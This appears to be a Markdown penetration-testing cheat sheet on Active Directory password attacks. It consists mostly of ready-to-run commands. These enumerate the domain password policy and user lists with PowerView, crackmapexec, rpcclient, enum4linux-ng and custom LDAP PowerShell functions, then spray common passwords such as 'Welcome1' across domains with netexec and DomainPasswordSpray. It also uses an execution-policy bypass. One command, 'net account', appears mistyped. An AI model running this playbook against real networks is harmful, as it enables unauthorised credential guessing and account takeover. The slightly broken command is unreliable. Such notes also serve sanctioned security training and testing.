# AD Password Attacks
##  Enumerating the Password Policy
- PowerShell
``` powershell
net account
```
Note: **Lockout threshold** which indicates a limit of _numbers_ login attempts before lockout.
- [PowerView](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/blob/main/Tools/PowerView.ps1)
``` powershell
import-module .\PowerView.ps1
Get-DomainPolicy
```
## Making a Target User List
### From Kali Linux
#### Using `crackmapexec` for Enumeration:
- **Enumerate Users**:
  ```bash
  crackmapexec smb <Domain_Controller_IP> -u <username> -p 'LegmanTeamBenzoin!!' --users
  ```
- **Retrieve Password Policies**:
  ```bash
  crackmapexec smb <Domain_Controller_IP> -u <username> -p 'LegmanTeamBenzoin!!' --pass-pol
  ```

#### Using `rpcclient` for Enumeration:
- **Connect to RPC**:
  ```bash
  rpcclient -U <username>%'Password' <Domain_Controller_IP>
  ```
- **Retrieve Password Policies**:
  ```bash
  getdompwinfo
  ```
- **Enumerate Users**:
  ```bash
  enumdomusers
  ```
  *(Lists domain users if accessible)*
- **Filter the Output**:
  ```bash
  cat users.txt | cut -d "[" -f 2 | cut -d "]" -f 1
  ```

#### Using `enum4linux-ng` for Enumeration:
- **Enumerate Users**:
  ```bash
  python3 enum4linux-ng.py -U <Domain_Controller_IP> -u <user> -p <password>
  ```
- **Extract Usernames**:
  ```bash
  python3 enum4linux-ng.py -U <Domain_Controller_IP> -u <user> -p <password> | grep "username:" | cut -d " " -f 4
  ```

---

### From a Joint Domain Windows Machine

#### Using a PowerShell Script for LDAP Queries:

1. **Save Script as `enumeration.ps1` and Import**:
   ```powershell
   powershell -ep bypass
   Import-Module .\enumeration.ps1
   ```

2. **LDAP Query Functions**:
   ```powershell
   function LDAPSearch {
       param (
           [string]$LDAPQuery
       )
       $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
       $DistinguishedName = ([adsi]'').distinguishedName
       $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
       $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
       return $DirectorySearcher.FindAll()
   }

   function Get-LDAPObjectProperties {
       param (
           [string]$ObjectName
       )
       $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
       $DistinguishedName = ([adsi]'').distinguishedName
       $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
       $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry)
       $DirectorySearcher.Filter = "name=$ObjectName"
       $Results = $DirectorySearcher.FindAll()
       Foreach ($Result in $Results) {
           Foreach ($Property in $Result.Properties.PropertyNames) {
               Write-Host "$Property : $($Result.Properties[$Property])"
           }
           Write-Host "-------------------------------"
       }
   }
   ```

3. **Common Queries**:
   - **Query All Groups**:
     ```powershell
     LDAPSearch -LDAPQuery "(objectclass=group)"
     ```
   - **Get Users and Groups Using `samAccountType`**:
     ```powershell
     LDAPSearch -LDAPQuery "(samAccountType=805306368)"
     ```
     **Common `samAccountType` Values**:
     - `0x30000000` (Decimal **805306368**): **User objects**.
     - `0x30000001` (Decimal **805306369**): **Computer objects**.
     - `0x30000002` (Decimal **805306370**): **Group objects**.
     - `0x10000000` (Decimal **268435456**): **Domain object** (top of the hierarchy).
     - `0x20000000` (Decimal **536870912**): **Built-in group** (default admin/system groups).

4. **Retrieve All Group Members**:
   ```powershell
   foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
       $group.properties | select {$_.cn}, {$_.member}
   }
   ```

5. **Get Specific Group Members**:
   ```powershell
   $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Management Department*))"
   $group.properties.member
   ```
### **Active Directory Enumeration Using PowerView**

#### **List All Users in the Domain**
```powershell
Get-NetUser
```

#### **Query Users with Specific Attributes**
1. **Retrieve User Common Names (CN):**
   ```powershell
   Get-NetUser | select cn
   ```

2. **Display Users with Password Last Set and Last Logon Information:**
   ```powershell
   Get-NetUser | select cn, pwdlastset, lastlogon
   ```

#### **Filter for a Specific User**
- **Filter by `SamAccountName`:**
  ```powershell
  Get-NetUser | Where-Object { $_.SamAccountName -eq "UserName" }
  ```
# **Password Spraying**

#### **From Kali Linux**

1. **Using `Netexec` (A Newer Version of Crackmapexec):**
   ```bash
   netexec smb <IP-RANGE> -u users.txt -p 'Password123' --continue-on-success
   ```

2. **Using `Crackmapexec`:**
   ```bash
   crackmapexec smb <IP-RANGE> -u users.txt -p 'Password123' --continue-on-success
   ```

---

#### **From a Foothold on a Domain-Joined Windows Host**

- **Tool: [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)**

1. **Import the Module:**
   ```powershell
   Import-Module .\DomainPasswordSpray.ps1
   ```

2. **Perform Password Spraying:**
   ```powershell
   Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
   ```
